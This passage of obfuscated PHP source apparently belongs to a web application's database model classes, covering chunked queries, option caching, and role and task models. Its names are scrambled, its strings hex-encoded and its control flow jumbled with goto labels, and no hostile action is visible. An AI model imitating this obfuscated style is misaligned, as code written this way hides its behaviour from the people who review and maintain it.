$_SERVER[µ…]; $f¾¥°²‘Öó = $this->tablePrefix . $this->tableName; foreach ($e»öŠÀºÆø as $CÀÒ°Ü¡ÈŸ) { if (!is_array($CÀÒ°Ü¡ÈŸ) || count($CÀÒ°Ü¡ÈŸ) != 4) { continue; } $aĞÉ˜ºï‹ = $CÀÒ°Ü¡ÈŸ[0] . $eùäŠñ‰¶[374] . $CÀÒ°Ü¡ÈŸ[1] . $eùäŠñ‰¶[115]; $AíËìÓ¤­ = $CÀÒ°Ü¡ÈŸ[2] . $eùäŠñ‰¶[374] . $CÀÒ°Ü¡ÈŸ[3] . $eùäŠñ‰¶[115]; $b´×†åˆÊã = "\165\x70\144\141\164\x65\x20{$f¾¥°²‘Öó}\40\x73\145\x74\x20{$AíËìÓ¤­}\40\167\x68\x65\x72\145\40{$aĞÉ˜ºï‹}\x3b"; $this->execute($b´×†åˆÊã); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($a®õ¢±ˆ¤˜ = false, $AÏÁ›ÏÔÇ = false) { $this->_chunkEvent = $a®õ¢±ˆ¤˜; $this->_chunkEventParam = $AÏÁ›ÏÔÇ; } private function chunkEventCheck($a‡™ôÅˆŠ) { if (!$this->_chunkEvent) { return; } $Aç¨¥è£—É = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $Aç¨¥è£—É[$_SERVER[µ…][375]] = $a‡™ôÅˆŠ; Hook::trigger($this->_chunkEvent, $Aç¨¥è£—É); } public function addAll($C™¨ËÖ’¢À, $AŸğ«äñŒÏ = array(), $dß×±ÑÇÌ = false) { goto f–‚·”§§; f–‚·”§§: $E´‘Œ¼ëå =& $_SERVER[µ…]; ignore_timeout(); $AÏØ³‘™æŒ = self::SQL_WHERE_IN_CHUNK; goto f´šƒ¼Ø¹±; f´šƒ¼Ø¹±: if (empty($C™¨ËÖ’¢À)) { $this->error = think_lang($E´‘Œ¼ëå[267]); return !1; } $AŸğ«äñŒÏ = $this->_parseOptions($AŸğ«äñŒÏ); foreach ($C™¨ËÖ’¢À as $D¿ùƒˆ¾Œ => $AªÖ‡ê÷†Ï) { $C™¨ËÖ’¢À[$D¿ùƒˆ¾Œ] = $this->_facade($AªÖ‡ê÷†Ï); $this->_beforeInsert($C™¨ËÖ’¢À[$D¿ùƒˆ¾Œ], $AŸğ«äñŒÏ); } goto a¹‰©ÈŸ¯ç; a¹‰©ÈŸ¯ç: if (method_exists($this->db, $E´‘Œ¼ëå[268])) { for ($cÍêÎ¬˜¥Ô = 0; $cÍêÎ¬˜¥Ô < count($C™¨ËÖ’¢À); $cÍêÎ¬˜¥Ô += $AÏØ³‘™æŒ) { $Dé¨ÀÏ£õ– = array_slice($C™¨ËÖ’¢À, $cÍêÎ¬˜¥Ô, $AÏØ³‘™æŒ); if (!is_array($Dé¨ÀÏ£õ–) || count($Dé¨ÀÏ£õ–) == 0) { break; } $e¥—©»Ï±¤ = $this->db->insertAll($Dé¨ÀÏ£õ–, $AŸğ«äñŒÏ, $dß×±ÑÇÌ); $this->chunkEventCheck(count($Dé¨ÀÏ£õ–)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($C™¨ËÖ’¢À as $D¿ùƒˆ¾Œ => $AªÖ‡ê÷†Ï) { $e¥—©»Ï±¤ = $this->db->insert($AªÖ‡ê÷†Ï, $AŸğ«äñŒÏ, $dß×±ÑÇÌ); } $this->commit(); } if (!1 !== $e¥—©»Ï±¤) { $Aòñ­ã÷•… = $this->getLastInsID(); if ($Aòñ­ã÷•…) { return $Aòñ­ã÷•…; } } return $e¥—©»Ï±¤; goto FÏ””ÇÍš¸; FÏ””ÇÍš¸: } public function save($F¦›£ê’ = '', $A«Ë•õ—Å½ = array()) { goto AßÈŒªè˜’; AßÈŒªè˜’: $B·á”÷Õ‘ =& $_SERVER[µ…]; $CÊó¼ìáë = self::SQL_WHERE_IN_CHUNK; $FµÇøö¸„ = $this->optionsValue(); goto f‰ñÜã×‚å; dÒÈ¬Š“¥: $Bå‰•ŠšÕÚ = $FµÇøö¸„[$B·á”÷Õ‘[271]][$C‚¤§² é][1]; $Bå‰•ŠšÕÚ = is_array($Bå‰•ŠšÕÚ) ? $Bå‰•ŠšÕÚ : array(); $D¡ô‘ˆ¼à· = count($Bå‰•ŠšÕÚ); goto C‹ø˜ ï±«; C‹ø˜ ï±«: for ($cÕ±Š†ñØê = 0; $cÕ±Š†ñØê < $D¡ô‘ˆ¼à·; $cÕ±Š†ñØê += $CÊó¼ìáë) { $bŸ÷õ¿‘† = array_slice($Bå‰•ŠšÕÚ, $cÕ±Š†ñØê, $CÊó¼ìáë); if (!is_array($bŸ÷õ¿‘†) || count($bŸ÷õ¿‘†) == 0) { break; } $FµÇøö¸„[$B·á”÷Õ‘[271]][$C‚¤§² é][1] = $bŸ÷õ¿‘†; $this->optionsValue($FµÇøö¸„); $a‹Öé‰åæÀ += parent::save($F¦›£ê’, $A«Ë•õ—Å½); $this->chunkEventCheck(count($bŸ÷õ¿‘†)); } $this->chunkEventSet(); return $a‹Öé‰åæÀ; goto dõ®î‘˜ÇÎ; f‰ñÜã×‚å: $C‚¤§² é = $this->findWhereField($FµÇøö¸„); if (!$C‚¤§² é) { return parent::save($F¦›£ê’, $A«Ë•õ—Å½); } $a‹Öé‰åæÀ = 0; goto dÒÈ¬Š“¥; dõ®î‘˜ÇÎ: } public function add($C£½Şê¹íñ = '', $a×±·…Í· = array(), $CŒ¾†‡ = false) { if ($this->addTaskStatus && is_array($C£½Şê¹íñ)) { $this->addTaskData[] = $C£½Şê¹íñ; return; } return parent::add($C£½Şê¹íñ, $a×±·…Í·, $CŒ¾†‡); } public function parseWhereLike($Cß¿‰ƒŸí×, $BÜÃ˜¥Áæ¬ = '', $EÏ…Ó™†³ = false, &$Böêœ•Õæ = false) { goto fßÒ³Ğƒ¿ù; cÊî˜Ùâà×: foreach ($Cß¿‰ƒŸí× as $Bá£é—îÛò => $A öñòòƒ») { if (is_array($A öñòòƒ») && count($A öñòòƒ») == 2 && $A öñòòƒ»[0] == $D­¹–ƒÚØ£[378] && is_string($A öñòòƒ»[1]) && substr($A öñòòƒ»[1], 0, 1) == $D­¹–ƒÚØ£[379] && substr($A öñòòƒ»[1], strlen($A öñòòƒ»[1]) - 1, 1) == $D­¹–ƒÚØ£[379]) { goto AÌÈÆ«¼Ğ¨; D­Û¸äª: $c›îÀ´ĞÈÚ = $this->db->escapeString($c›îÀ´ĞÈÚ); if (!strpos($F¶¦§Š‹Ö, $D­¹–ƒÚØ£[94])) { $F¶¦§Š‹Ö = $D­¹–ƒÚØ£[380] . $F¶¦§Š‹Ö . $D­¹–ƒÚØ£[380]; } if ($Bµ±òÀ‹Îî[$D­¹–ƒÚØ£[381]]) { $c›îÀ´ĞÈÚ = $D­¹–ƒÚØ£[115] . $c›îÀ´ĞÈÚ . $D­¹–ƒÚØ£[115]; } goto Dè¦å¦…§™; Dè¦å¦…§™: $FÌÃÛÔ¯¶Ò[$E¼ß¢å¯©] = $D­¹–ƒÚØ£[382] . $F¶¦§Š‹Ö . $D­¹–ƒÚØ£[383] . $c›îÀ´ĞÈÚ . $D­¹–ƒÚØ£[384]; $E¼ß¢å¯©++; continue; goto b„¼á«•‡; AÌÈÆ«¼Ğ¨: $Böêœ•Õæ = !0; $F¶¦§Š‹Ö = is_string($Bá£é—îÛò) ? $Bá£é—îÛò : $BÜÃ˜¥Áæ¬; $c›îÀ´ĞÈÚ = substr($A öñòòƒ»[1], 1, strlen($A öñòòƒ»[1]) - 2); goto D­Û¸äª; b„¼á«•‡: } if (is_array($A öñòòƒ»)) { $BÜÃ˜¥Áæ¬ = is_string($Bá£é—îÛò) ? $Bá£é—îÛò : $BÜÃ˜¥Áæ¬; $A öñòòƒ» = $this->parseWhereLike($A öñòòƒ», $BÜÃ˜¥Áæ¬, !0, $Böêœ•Õæ); } if (is_numeric($Bá£é—îÛò)) { $FÌÃÛÔ¯¶Ò[$E¼ß¢å¯©] = $A öñòòƒ»; $E¼ß¢å¯©++; } else { $FÌÃÛÔ¯¶Ò[$Bá£é—îÛò] = $A öñòòƒ»; } } if ($Böêœ•Õæ && !$EÏ…Ó™†³) { trace_log(array($FÌÃÛÔ¯¶Ò, $Cß¿‰ƒŸí×), $D­¹–ƒÚØ£[271]); } return $FÌÃÛÔ¯¶Ò; goto EÆæº½ñ; fßÒ³Ğƒ¿ù: $D­¹–ƒÚØ£ =& $_SERVER[µ…]; $Bµ±òÀ‹Îî = $GLOBALS[$D­¹–ƒÚØ£[6]][$D­¹–ƒÚØ£[376]]; if (!$Bµ±òÀ‹Îî[$D­¹–ƒÚØ£[377]]) { return $Cß¿‰ƒŸí×; } goto D¹ŠË„¸è´; D¹ŠË„¸è´: if (!is_array($Cß¿‰ƒŸí×)) { return $Cß¿‰ƒŸí×; } $FÌÃÛÔ¯¶Ò = array(); $E¼ß¢å¯© = 0; goto cÊî˜Ùâà×; EÆæº½ñ: } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($eÇë­¼Ìœ = array()) { goto BŸ ¥Êãò; C£ò°éä¿: $DÂ™¸¤ = is_array($DÂ™¸¤) ? $DÂ™¸¤ : array(); $F§­ÅØöËô = null; for ($EçÓâŒ”ÂÙ = 0; $EçÓâŒ”ÂÙ < count($DÂ™¸¤); $EçÓâŒ”ÂÙ += $c½¼ø¾ÇŒä) { $A»Ë¥ÆŒ¼ì = array_slice($DÂ™¸¤, $EçÓâŒ”ÂÙ, $c½¼ø¾ÇŒä); if (!is_array($A»Ë¥ÆŒ¼ì) || count($A»Ë¥ÆŒ¼ì) == 0) { break; } $Bñõöö[$d»ÒÂÏÇñ…[271]][$A‡¹©ŞÇï][1] = $A»Ë¥ÆŒ¼ì; $this->optionsValue($Bñõöö); $dÔï¼„Ä§á = parent::select($eÇë­¼Ìœ); if (!$dÔï¼„Ä§á) { continue; } if (is_null($F§­ÅØöËô)) { $F§­ÅØöËô = array(); } $F§­ÅØöËô = array_merge($F§­ÅØöËô, $dÔï¼„Ä§á); } goto dÕ ÔµÅµÙ; dÕ ÔµÅµÙ: return $F§­ÅØöËô; goto A¥Î‹õŸ; E³£Ó ùºÅ: $A‡¹©ŞÇï = $this->findWhereField($Bñõöö); if (!$A‡¹©ŞÇï || isset($Bñõöö[$d»ÒÂÏÇñ…[288]]) || isset($Bñõöö[$d»ÒÂÏÇñ…[349]])) { return parent::select($eÇë­¼Ìœ); } $DÂ™¸¤ = $Bñõöö[$d»ÒÂÏÇñ…[271]][$A‡¹©ŞÇï][1]; goto C£ò°éä¿; BŸ ¥Êãò: $d»ÒÂÏÇñ… =& $_SERVER[µ…]; $c½¼ø¾ÇŒä = self::SQL_WHERE_IN_CHUNK; $Bñõöö = $this->optionsValue(); goto E³£Ó ùºÅ; A¥Î‹õŸ: } public function delete($cÀ—ß©¥‘ = array()) { goto AËÇ£ŒÕ¾‰; b‘ñÜ¸ì¼¡: return $C¹ß¬®ÉÃÈ; goto BÆÔ—ÃÇã; D¸±òá´‚é: $C…º’Ì‹è÷ = $this->findWhereField($aÉ¿ÜôÒ¿); if (!$C…º’Ì‹è÷) { return parent::delete($cÀ—ß©¥‘); } $C¹ß¬®ÉÃÈ = 0; goto bŸËğœĞ‹; AËÇ£ŒÕ¾‰: $CøÒ°…’œ„ =& $_SERVER[µ…]; $Bñ•Ó…¤ùù = self::SQL_WHERE_IN_CHUNK; $aÉ¿ÜôÒ¿ = $this->optionsValue(); goto D¸±òá´‚é; bŸËğœĞ‹: $B‡‹ÛÌˆ†ğ = $aÉ¿ÜôÒ¿[$CøÒ°…’œ„[271]][$C…º’Ì‹è÷][1]; $B‡‹ÛÌˆ†ğ = is_array($B‡‹ÛÌˆ†ğ) ? $B‡‹ÛÌˆ†ğ : array(); for ($F™Œ÷Ñ¿Æ” = 0; $F™Œ÷Ñ¿Æ” < count($B‡‹ÛÌˆ†ğ); $F™Œ÷Ñ¿Æ” += $Bñ•Ó…¤ùù) { $A¦Ÿ÷¼…ˆŠ = array_slice($B‡‹ÛÌˆ†ğ, $F™Œ÷Ñ¿Æ”, $Bñ•Ó…¤ùù); if (!is_array($A¦Ÿ÷¼…ˆŠ) || count($A¦Ÿ÷¼…ˆŠ) == 0) { break; } $aÉ¿ÜôÒ¿[$CøÒ°…’œ„[271]][$C…º’Ì‹è÷][1] = $A¦Ÿ÷¼…ˆŠ; $this->optionsValue($aÉ¿ÜôÒ¿); $C¹ß¬®ÉÃÈ += parent::delete($cÀ—ß©¥‘); } goto b‘ñÜ¸ì¼¡; BÆÔ—ÃÇã: } private function findWhereField($fëÕõÊÙ“ò) { $b¯š÷¶ÛÕº =& $_SERVER[µ…]; $Bœ£ğ–í”‡ = self::SQL_WHERE_IN_CHUNK; if (!is_array($fëÕõÊÙ“ò) || !is_array($fëÕõÊÙ“ò[$b¯š÷¶ÛÕº[271]])) { return !1; } foreach ($fëÕõÊÙ“ò[$b¯š÷¶ÛÕº[271]] as $fñ¼êéÈòÎ => $Bâ‰ã³÷³È) { if (is_array($Bâ‰ã³÷³È) && isset($Bâ‰ã³÷³È[0]) && is_string($Bâ‰ã³÷³È[0]) && strtolower($Bâ‰ã³÷³È[0]) == $b¯š÷¶ÛÕº[7] && is_array($Bâ‰ã³÷³È[1]) && count($Bâ‰ã³÷³È[1]) > $Bœ£ğ–í”‡) { ignore_timeout(); return $fñ¼êéÈòÎ; } } return !1; } } class ModelBaseLight { public $optionType = ''; public $modelType = "\123\171\163\x74\x65\x6d\117\160\164\151\157\x6e"; public $field = array(); public function listData($a‹„¾´º = false, $DÎ«—¸ ¯Ã = "\x6d\x6f\144\151\146\x79\x54\151\x6d\x65", $eŸ”Õ»…æá = false) { $A¥Öªšíº = Model($this->modelType)->get(!1, $this->optionType, !0); if (!$A¥Öªšíº) { return $a‹„¾´º ? null : array(); } if (!$a‹„¾´º) { $A¥Öªšíº = array_filter(array_values($A¥Öªšíº)); return array_sort_by($A¥Öªšíº, $DÎ«—¸ ¯Ã, $eŸ”Õ»…æá); } return $A¥Öªšíº[$_SERVER[µ…][385] . $a‹„¾´º]; } public function insert($DƒÕÍ×îÛ) { goto f«Èªëâ©Î; e”§õÑ‘ˆ¡: $DƒÕÍ×îÛ[$AĞòñµÑ›á[83]] = time(); Model($this->modelType)->set($AĞòñµÑ›á[386], $Fª“®“øŠ, $this->optionType . $AĞòñµÑ›á[387]); Model($this->modelType)->set($AĞòñµÑ›á[385] . $Fª“®“øŠ, $DƒÕÍ×îÛ, $this->optionType); goto E‹ÄİÚÃÛ; f«Èªëâ©Î: $AĞòñµÑ›á =& $_SERVER[µ…]; $DƒÕÍ×îÛ = array_field_key($DƒÕÍ×îÛ, $this->field); $Fª“®“øŠ = Model($this->modelType)->get($AĞòñµÑ›á[386], $this->optionType . $AĞòñµÑ›á[387]); goto D‘£Œ’²êæ; E‹ÄİÚÃÛ: return $Fª“®“øŠ; goto f½ àÑ”¼; D‘£Œ’²êæ: $Fª“®“øŠ = $Fª“®“øŠ ? $Fª“®“øŠ : 0; $DƒÕÍ×îÛ[$AĞòñµÑ›á[388]] = ++$Fª“®“øŠ; $DƒÕÍ×îÛ[$AĞòñµÑ›á[192]] = time(); goto e”§õÑ‘ˆ¡; f½ àÑ”¼: } public function update($EàÁñÅ¤å®, $eô’¢Èƒ†³) { goto C¿±À›ê¼†; a‰Ã¡§Á”: return Model($this->modelType)->set($fÈ‚ÒÑ„Ú¹[385] . $EàÁñÅ¤å®, $eô’¢Èƒ†³, $this->optionType); goto a¶ø ‘Èƒˆ; B”“è·šË: if (!$B«Ó—íßò) { return !1; } $eô’¢Èƒ†³ = array_merge($B«Ó—íßò, $eô’¢Èƒ†³); $eô’¢Èƒ†³[$fÈ‚ÒÑ„Ú¹[83]] = time(); goto a‰Ã¡§Á”; C¿±À›ê¼†: $fÈ‚ÒÑ„Ú¹ =& $_SERVER[µ…]; $eô’¢Èƒ†³ = array_field_key($eô’¢Èƒ†³, $this->field); $B«Ó—íßò = $this->listData($EàÁñÅ¤å®); goto B”“è·šË; a¶ø ‘Èƒˆ: } public function remove($Aœ­ƒ¹íàé) { return Model($this->modelType)->remove($_SERVER[µ…][385] . $Aœ­ƒ¹íàé, $this->optionType); } public function clear() { $a”¬¢¹ˆæ¤ =& $_SERVER[µ…]; Model($this->modelType)->remove($a”¬¢¹ˆæ¤[386], $this->optionType . $a”¬¢¹ˆæ¤[387]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($bŒİòâö†, $aíŠµ’ÈÔå) { if (!$aíŠµ’ÈÔå) { return !1; } $AàÓŠİÍ× = $this->listData(); $AàÓŠİÍ× = array_to_keyvalue($AàÓŠİÍ×, $bŒİòâö†); return isset($AàÓŠİÍ×[$aíŠµ’ÈÔå]) ? $AàÓŠİÍ×[$aíŠµ’ÈÔå] : !1; } public function findByName($e©‚‹±ÈĞ§) { return $this->findByKey($_SERVER[µ…][28], $e©‚‹±ÈĞ§); } protected function resetData($E”¸ˆ “¼ò) { $AŸ‘µ„ÂŸ =& $_SERVER[µ…]; $E”¸ˆ “¼ò = is_array($E”¸ˆ “¼ò) ? $E”¸ˆ “¼ò : array(); $a‡´²—‘ = array(); for ($Eæ›Ä§…ºº = 0; $Eæ›Ä§…ºº < count($E”¸ˆ “¼ò); $Eæ›Ä§…ºº++) { $a‡´²—‘[$AŸ‘µ„ÂŸ[385] . $E”¸ˆ “¼ò[$Eæ›Ä§…ºº][$AŸ‘µ„ÂŸ[388]]] = $E”¸ˆ “¼ò[$Eæ›Ä§…ºº]; } return Model($this->modelType)->set($a‡´²—‘, !1, $this->optionType); } private function getAutoName($BÅˆ¡‡®Ùê) { $aç£ŒÄŠ· = array_to_keyvalue($this->listData(), $_SERVER[µ…][28]); if (!$aç£ŒÄŠ· || !isset($aç£ŒÄŠ·[$BÅˆ¡‡®Ùê])) { return $BÅˆ¡‡®Ùê; } for ($fÙ‡¢Âº÷ = 1; $fÙ‡¢Âº÷ < count($aç£ŒÄŠ·); $fÙ‡¢Âº÷++) { $b¶¸«ã³Š = $BÅˆ¡‡®Ùê . "\x28{$fÙ‡¢Âº÷}\x29"; if (!isset($aç£ŒÄŠ·[$b¶¸«ã³Š])) { return $b¶¸«ã³Š; } } return $b¶¸«ã³Š; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($bØÈ²Ü™á = false, $A„Ë•ä‚Ù‘ = '', $C‘êä¨ŸĞª = false) { goto føñˆ¾â†; c˜£Ó îÆÒ: $FÀâ˜Ú»µ = $this->where($EÄ¯è“ÖÙ)->select(); $FÀâ˜Ú»µ = array_to_keyvalue($FÀâ˜Ú»µ, $cá…µ¸’[92], $cá…µ¸’[370]); foreach ($FÀâ˜Ú»µ as $FÀ‹±¼Ô†— => $EöÑ¡…æğ) { if ($C‘êä¨ŸĞª || in_array($FÀ‹±¼Ô†—, $this->jsonField)) { $FÀâ˜Ú»µ[$FÀ‹±¼Ô†—] = json_decode($EöÑ¡…æğ, !0); } } goto D„ÃÆ„ŞŞ; føñˆ¾â†: $cá…µ¸’ =& $_SERVER[µ…]; $FÀâ˜Ú»µ = $this->cacheGet($A„Ë•ä‚Ù‘); $C…‹“åÑÏ = $this->optionDefault($A„Ë•ä‚Ù‘); goto eßĞÄ¢Ìà¨; D„ÃÆ„ŞŞ: $this->cacheSet($A„Ë•ä‚Ù‘, $FÀâ˜Ú»µ); $FÀâ˜Ú»µ = array_merge($C…‹“åÑÏ, $FÀâ˜Ú»µ); return $bØÈ²Ü™á ? $FÀâ˜Ú»µ[$bØÈ²Ü™á] : $FÀâ˜Ú»µ; goto a†‰Ó¤Ì³¹; eßĞÄ¢Ìà¨: $C…‹“åÑÏ = is_array($C…‹“åÑÏ) ? $C…‹“åÑÏ : array(); if (is_array($FÀâ˜Ú»µ)) { $FÀâ˜Ú»µ = array_merge($C…‹“åÑÏ, $FÀâ˜Ú»µ); return $bØÈ²Ü™á ? isset($FÀâ˜Ú»µ[$bØÈ²Ü™á]) ? $FÀâ˜Ú»µ[$bØÈ²Ü™á] : null : $FÀâ˜Ú»µ; } $EÄ¯è“ÖÙ = $this->filterWhere(array($cá…µ¸’[29] => $A„Ë•ä‚Ù‘)); goto c˜£Ó îÆÒ; a†‰Ó¤Ì³¹: } public function set($B††–ìîÃ, $F˜¥ÛÛ©’œ = false, $a„´©‘Ôãó = '') { goto eãŒ÷„Ë¢; eãŒ÷„Ë¢: $eà«á¤áÕ¾ =& $_SERVER[µ…]; $this->cacheRemove($a„´©‘Ôãó); $Aîõœ¾»” = array(); goto fÔä–´˜Ã¬; D¨Ü¼©õêÇ: return $this->addAll($Aîõœ¾»”, array(), !0); goto eÏÁµ½â·; fÔä–´˜Ã¬: $aÁ™È’Â×— = is_array($B††–ìîÃ) ? $B††–ìîÃ : array($B††–ìîÃ => $F˜¥ÛÛ©’œ); foreach ($aÁ™È’Â×— as $a˜ˆÑŠ©Ò¬ => $C°ŸÑøŒ‹„) { if (is_array($C°ŸÑøŒ‹„)) { $C°ŸÑøŒ‹„ = json_encode_force($C°ŸÑøŒ‹„); } $this->checkLength($C°ŸÑøŒ‹„, !1, $this->tableName . $eà«á¤áÕ¾[4] . $B††–ìîÃ); $C°ŸÑøŒ‹„ = self::textEncode($C°ŸÑøŒ‹„); $aÁ™È’Â×— = array($eà«á¤áÕ¾[29] => $a„´©‘Ôãó, $eà«á¤áÕ¾[92] => $a˜ˆÑŠ©Ò¬, $eà«á¤áÕ¾[370] => $C°ŸÑøŒ‹„); $Aîõœ¾»”[] = $this->filterWhere($aÁ™È’Â×—); } if (!$Aîõœ¾»”) { return !0; } goto D¨Ü¼©õêÇ; eÏÁµ½â·: } protected function optionDefault($cë†ê®ö = '') { return !1; } public function setDeep($Aˆ‘÷À´İå, $a¹…ôÛéáŒ = false, $fèåğÁ³„ó = '') { $A÷…„¾Á¿ß = explode($_SERVER[µ…][94], $Aˆ‘÷À´İå); $a¸ÈëŞ§³Ë = $this->get(); array_set_value($a¸ÈëŞ§³Ë, $Aˆ‘÷À´İå, $a¹…ôÛéáŒ); $this->set($A÷…„¾Á¿ß[0], $a¸ÈëŞ§³Ë[$A÷…„¾Á¿ß[0]], $fèåğÁ³„ó); } public function remove($A«‚†‘Ÿ´¶, $f‘Ä¬ĞŠÛ½ = '') { $e‘Ÿ ®ßš´ =& $_SERVER[µ…]; $this->cacheRemove($f‘Ä¬ĞŠÛ½); $aé°ì¼í¨ = $this->filterWhere(array($e‘Ÿ ®ßš´[92] => $A«‚†‘Ÿ´¶, $e‘Ÿ ®ßš´[29] => $f‘Ä¬ĞŠÛ½)); if (is_null($A«‚†‘Ÿ´¶)) { unset($aé°ì¼í¨[$e‘Ÿ ®ßš´[92]]); } return $this->where($aé°ì¼í¨)->delete(); } public function cacheSet($DëŒÜÁ¼™ä, $c¤äÖÒ¥• = false) { return Cache::set($this->cacheKey($DëŒÜÁ¼™ä), $c¤äÖÒ¥•); } public function cacheGet($eŒ¶ù¶êßµ) { return Cache::get($this->cacheKey($eŒ¶ù¶êßµ)); } public function cacheRemove($Eİ¾â¡ÑôÍ) { return Cache::remove($this->cacheKey($Eİ¾â¡ÑôÍ)); } protected function filterWhere($A¹Íâ¡‡×) { return $A¹Íâ¡‡×; } protected function cacheKey($FØ³ØØÉ) { return $FØ³ØØÉ; } } goto f¬®–¦±¢ä; dŒ‘‰‘Ï™: class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\145\155\x2e\x72\157\154\x65\114\151\163\x74"; public $field = array("\x6e\141\x6d\145", "\141\x75\x74\150", "\154\x61\x62\x65\154", "\x64\x69\163\160\154\141\x79", "\163\171\x73\x74\x65\155", "\144\145\x73\x63", "\151\x67\x6e\x6f\x72\145\x45\x78\164", "\x69\x67\x6e\157\x72\145\106\151\154\x65\123\x69\x7a\x65", "\x61\144\x6d\x69\156\x69\x73\164\x72\141\x74\157\162", "\x73\157\x72\164"); public function listData($A†ø•Œá³Ì = false, $dÕ‰óóøé« = "\163\157\162\164", $eğ–”ÜÍ¿‰ = false) { $fáµÙ÷İÇ =& $_SERVER[µ…]; $cäèô­„¹¯ = parent::listData($A†ø•Œá³Ì, $dÕ‰óóøé«, $eğ–”ÜÍ¿‰); if (!$A†ø•Œá³Ì) { foreach ($cäèô­„¹¯ as $Då…ÍÚÔõ => $Døê¤Œ×ÂÀ) { if ($Døê¤Œ×ÂÀ[$fáµÙ÷İÇ[1859]] == 1) { $cäèô­„¹¯[$Då…ÍÚÔõ][$fáµÙ÷İÇ[425]] = LNG($fáµÙ÷İÇ[2079]); } } } return $cäèô­„¹¯; } public function update($Eº·Æ½ëƒŒ, $a‹¢ÌÖÄ‹ê) { goto e§Šº©ˆ¼ä; e§Šº©ˆ¼ä: $BñÛ©ŞâËª =& $_SERVER[µ…]; $b£Á‰œÇ¦… = parent::listData($Eº·Æ½ëƒŒ); $cùíÀğçÏä = $this->findByName($a‹¢ÌÖÄ‹ê[$BñÛ©ŞâËª[28]]); goto Fö†“ŞÉÚ¥; Fö†“ŞÉÚ¥: if (!$b£Á‰œÇ¦… || $cùíÀğçÏä && $cùíÀğçÏä[$BñÛ©ŞâËª[388]] != $b£Á‰œÇ¦…[$BñÛ©ŞâËª[388]]) { return !1; } if ($cùíÀğçÏä[$BñÛ©ŞâËª[1859]] == 1) { $a‹¢ÌÖÄ‹ê = array($BñÛ©ŞâËª[28] => $a‹¢ÌÖÄ‹ê[$BñÛ©ŞâËª[28]], $BñÛ©ŞâËª[1690] => $a‹¢ÌÖÄ‹ê[$BñÛ©ŞâËª[1690]]); } $this->filterAuth($a‹¢ÌÖÄ‹ê[$BñÛ©ŞâËª[400]]); goto b åÏÎî‰; b åÏÎî‰: return parent::update($Eº·Æ½ëƒŒ, $a‹¢ÌÖÄ‹ê); goto eˆºôŠÕßÔ; eˆºôŠÕßÔ: } public function remove($aŸ’Òî¢ˆ) { $CÙ¡¢“ŸÉ = parent::listData($aŸ’Òî¢ˆ); if (!$CÙ¡¢“ŸÉ || $CÙ¡¢“ŸÉ[$_SERVER[µ…][1146]]) { return !1; } return parent::remove($aŸ’Òî¢ˆ); } public function add($CÁõ¾½ìÍ) { goto EÅÉ‡óÙğ¡; F“ãÅÛ¹å: return parent::insert($CÁõ¾½ìÍ); goto càã¼¾³§”; EÅÉ‡óÙğ¡: $d²ØöÈì¨ì =& $_SERVER[µ…]; $bàÍŠçé = $CÁõ¾½ìÍ[$d²ØöÈì¨ì[28]]; if ($this->findByName($bàÍŠçé)) { return !1; } goto fˆŒæÔäÖÚ; fˆŒæÔäÖÚ: $Bò²¢„Í¦ = array($d²ØöÈì¨ì[407] => $bàÍŠçé, $d²ØöÈì¨ì[1675] => $d²ØöÈì¨ì[33], $d²ØöÈì¨ì[1671] => $d²ØöÈì¨ì[1679], $d²ØöÈì¨ì[2080] => 1, $d²ØöÈì¨ì[1674] => 0, $d²ØöÈì¨ì[2081] => 0, $d²ØöÈì¨ì[1673] => $this->getSort()); $CÁõ¾½ìÍ = array_merge($Bò²¢„Í¦, $CÁõ¾½ìÍ); $this->filterAuth($CÁõ¾½ìÍ[$d²ØöÈì¨ì[400]]); goto F“ãÅÛ¹å; càã¼¾³§”: } private function getSort() { $AÚÙÑØÕ´ =& $_SERVER[µ…]; $EÀˆøø»é¾ = parent::listData(); $Dš·¯¬ƒŒ¾ = array_to_keyvalue($EÀˆøø»é¾, $AÚÙÑØÕ´[33], $AÚÙÑØÕ´[1692]); return empty($Dš·¯¬ƒŒ¾) ? 0 : max($Dš·¯¬ƒŒ¾) + 1; } private function filterAuth(&$cñ˜¼ÂãÆš) { $bÖ®½Ğ¿ =& $_SERVER[µ…]; $e¿´”Š¢¬² = array(); $eæõ™™È˜” = array_filter(explode($bÖ®½Ğ¿[47], $cñ˜¼ÂãÆš)); foreach ($eæõ™™È˜” as $cñ˜¼ÂãÆš) { $c‚Ÿªò² = explode($bÖ®½Ğ¿[94], $cñ˜¼ÂãÆš); if ($c‚Ÿªò²[0] == $bÖ®½Ğ¿[2082] && $c‚Ÿªò²[1] != $bÖ®½Ğ¿[1067]) { $B˜¢ÌÖº­İ = $c‚Ÿªò²[0] . $bÖ®½Ğ¿[94] . $c‚Ÿªò²[1] . $bÖ®½Ğ¿[2083]; if (!in_array($B˜¢ÌÖº­İ, $eæõ™™È˜”)) { $e¿´”Š¢¬²[] = $B˜¢ÌÖº­İ; } } $e¿´”Š¢¬²[] = $cñ˜¼ÂãÆš; } $cñ˜¼ÂãÆš = implode($bÖ®½Ğ¿[47], $e¿´”Š¢¬²); } public function sort($CêÒçË©«š, $BŞ‹ã×ÕÔ) { return parent::update($CêÒçË©«š, $BŞ‹ã×ÕÔ); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\x65\x6d\56\x74\141\x73\153\114\151\x73\164"; public $field = array("\x6e\x61\155\x65", "\x74\x79\x70\x65", "\x65\x76\145\x6e\x74", "\x74\151\155\x65", "\144\x65\163\x63", "\163\171\x73\x74\x65\x6d", "\x65\x6e\x61\x62\x6c\145", "\154\x61\x73\164\122\165\x6e", "\163\157\162\164"); public function listData($C•”¥Òìì¢ = false, $aäµÏğÙËÓ = "\x73\x6f\162\164", $EÒæµæö = false) { return parent::listData($C•”¥Òìì¢, $aäµÏğÙËÓ, $EÒæµæö); } public function add($FãŠæÑÕ‹Ç) { 